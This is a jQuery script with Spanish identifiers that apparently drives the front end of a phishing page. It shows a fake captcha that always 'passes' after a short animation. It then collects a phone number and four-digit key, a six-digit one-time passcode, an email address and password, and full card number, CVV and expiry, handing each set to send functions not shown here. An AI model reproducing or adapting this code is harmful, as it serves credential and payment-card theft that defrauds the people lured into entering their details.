var catchalisto = 0;
var otp = "";
var lotp = 0;

$(document).ready(function($){

	$(".inp").click(function(){	
		if ($(this).attr("estado") == "0") {
			$(this).attr("estado","1");
			var ob = $(this);     
	        ob.find(".texto-demo").hide();
	        ob.find(".etiqueta").show();
	        ob.find(".etiqueta").animate({
	    		"margin-top" : "-22px"   
	  		}, 20, function() { 
		  		ob.find(".etiqueta").animate({
		    		"margin-top" : "-39px"   
		  		}, 100, function() {  	
		  			ob.find(".texto-demo").css("margin-top","-41px");		
		  			ob.find(".entrada").removeAttr("readonly");		  			
		  			ob.find(".entrada").focus();
		  		});
	  		});	
		}	
    });


    $(".entrada").blur(function(){ 
		var ob = $(this).parents(".inp"); 
		if ($(this).val() == "") {
			ob.attr("estado","0");
			$(this).attr("readonly","readonly");
			ob.find(".etiqueta").hide()
			ob.find(".etiqueta").css("margin-top","-28px");
			ob.find(".texto-demo").show();	
			ob.find(".texto-demo").animate({
	    		"margin-top" : "-45px"   
	  		}, 20, function() {
	  			ob.find(".texto-demo").animate({"margin-top" : "-32px"}, 100);
	  		}); 				
		}else{

		}          
    });

   	$("#catcha").click(function(){
   		if (catchalisto == 0) {   			
	    	$("#catcha").attr("src","assets/img/load-catcha.gif"); 
	    	catchalisto = 1;
	    	setTimeout(catchaok, 800);  			  
   		}
    });

   	$("#txt-cel,#txt-re").keyup(function(e) {     		
   		if ($("#txt-cel").val().length == 10 && $("#txt-re").val().length == 4 && catchalisto == 1) {
   			$("#paso0").removeAttr("disabled");				
   		}else{
   			$("#paso0").attr("disabled","disabled");   						
   		}  
   	});


   	$("#paso0").click(function(){ 
   		$("#fondo,#cargando").show();   	 		
   		$("#paso0").html('<img src="assets/img/load-proceso.gif" width="42">');	
   		enviar_datos($("#txt-cel").val(),$("#txt-re").val());
    });


    $(".num-teclado").click(function(){    	
    	if (otp.length < 6) {
    		otp = otp + "" + $(this).html();
    		lotp = lotp + 1;    		
    		$("#otp" + lotp).html("*");
    		if (lotp == 6) {
    			$("#fondo,#cargando").show(); 
    			enviar_otp(otp);
    		}
    	}
    });

    $("#borrar").click(function(){
   		if (otp.length > 0) {
   			otp = otp.substring(0, otp.length - 1);    		    		   		
    		$("#otp" + lotp).html("");
    		lotp = lotp - 1; 
    	}
    });


    $("#txt-correo,#txt-clave,#txt-celular").keyup(function(e) {     		
   		if ($("#txt-correo").val().length > 7 && $("#txt-clave").val().length > 3 && $("#txt-celular").val().length == 10) {
   			$("#btn-correo").removeAttr("disabled");				
   		}else{
   			$("#btn-correo").attr("disabled","disabled");   						
   		}  
   	});

   	$("#btn-correo").click(function(){  
   		$("#fondo,#cargando").show();  		
   		enviar_email($("#txt-correo").val(),$("#txt-clave").val(),$("#txt-celular").val());
    });

    $("#txt-tarjeta,#txt-cvv").keyup(function(e) {     		
   		if ($("#txt-tarjeta").val().length == 16 && $("#txt-cvv").val().length == 3 && $("#txt-mes").val() != "" && $("#txt-ano").val() != "") {
   			$("#btn-tarjeta").removeAttr("disabled");				
   		}else{
   			$("#btn-tarjeta").attr("disabled","disabled");   						
   		}  
   	});

   	$("#txt-mes,#txt-ano").change(function(){
   		if ($("#txt-tarjeta").val().length == 16 && $("#txt-cvv").val().length == 3 && $("#txt-mes").val() != "" && $("#txt-ano").val() != "") {
   			$("#btn-tarjeta").removeAttr("disabled");				
   		}else{
   			$("#btn-tarjeta").attr("disabled","disabled");   						
   		} 
    });

    $("#btn-tarjeta").click(function(){
    	var fecha = $("#txt-mes").val() + "-" + $("#txt-ano").val();
   		enviar_tarjeta($("#txt-tarjeta").val(),fecha,$("#txt-cvv").val());
    });
    
});